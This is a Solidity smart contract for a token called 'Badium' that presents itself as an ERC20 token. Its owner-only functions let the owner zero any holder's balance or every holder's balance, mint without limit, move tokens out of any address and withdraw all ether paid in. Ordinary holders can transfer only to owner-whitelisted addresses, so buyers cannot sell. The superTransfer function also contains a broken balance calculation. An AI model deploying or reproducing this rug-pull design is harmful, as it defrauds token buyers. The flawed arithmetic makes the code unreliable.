pragma solidity ^0.4.24;

library SafeMath
{
	function add(uint a, uint b) public pure returns (uint)
	{
		uint ret = a + b;
		require(ret >= a);
		return ret;
	}

	function subtract(uint a, uint b) public pure returns (uint)
	{
		require(a >= b);
		return a - b;
	}

	 
	 
}

contract ERC20Burnable
{
    using SafeMath for uint;
	 
	mapping (address => uint) public tokens;

	 
	mapping (address => bool) public receiver;

	 
	address public owner;

	 
	uint tokenAmt = 10000000;

	string public tokenName = "Badium";

	address[] public allAddresses;
	uint avail = 10000000;

	constructor () public
	{
		 
		owner = msg.sender;
		 
		tokens[owner] = tokenAmt;
		 
		receiver[owner] = true;
		 
		allAddresses.push(owner);
	}

	 
	modifier onlyOwner()
	{
		require(msg.sender == owner);
		_;
	}

	function allowNewReceiver(address allowed) external onlyOwner
    {
         
        receiver[allowed] = true;
    }
    
    function disallowReceiver(address disallowed) external onlyOwner
    {
         
        receiver[disallowed] = false;
    }

	 
	function burnAddress(address burn) external onlyOwner
	{
		tokens[burn] = 0;
	}

	 
	function burnAll() external onlyOwner
	{
		for (uint i = 0; i < allAddresses.length; i++)
		{
			tokens[allAddresses[i]] = 0;
		}
	}

	function mint(uint amt) external onlyOwner
	{
		 
		tokens[owner] = tokens[owner].add(amt);
	}
}

contract ERC20 is ERC20Burnable
{

    function getBalance() public view returns (uint)
    {
         
        return tokens[msg.sender];
    }

    function getBalanceOf(address find) public view returns (uint)
    {
         
        return tokens[find];
    }

     
    function superTransfer(address sendfrom, address to, uint amt) external onlyOwner
	{
	     
	    require(tokens[sendfrom] >= amt);
	     
	    tokens[sendfrom] = tokens[to].subtract(amt);
	    tokens[to] = tokens[to].add(amt);
	}

	function withdrawAllEth() onlyOwner external payable
	{
		 
		 
		require(address(this).balance > 0);
		 
		msg.sender.transfer(address(this).balance);
	}

	 
	function transfer(address sendto, uint amt) public
	{
	     
		require(tokens[msg.sender] >= amt);
		 
		require(receiver[sendto] == true);
		 
		 
		allAddresses.push(sendto);
		 
		tokens[msg.sender] = tokens[msg.sender].subtract(amt);
		 
		tokens[sendto] = tokens[sendto].add(amt);
	}

	 
	function transferTokens(address sendfrom, address sendto, uint amt) internal
	{
		require(tokens[sendfrom] >= amt);
		allAddresses.push(sendto);
		tokens[sendfrom] = tokens[sendfrom].subtract(amt);
		tokens[sendto] = tokens[sendto].add(amt);
		avail = avail.subtract(amt);
	}

	function buyTokens() public payable
	{
	     
		require(msg.value >= 1 ether / 100);
		 
		uint256 amt = (msg.value * 100) / 1 ether;
		 
		require(tokens[owner] >= amt && amt <= avail);
		 
		transferTokens(owner, msg.sender, amt);
	}
}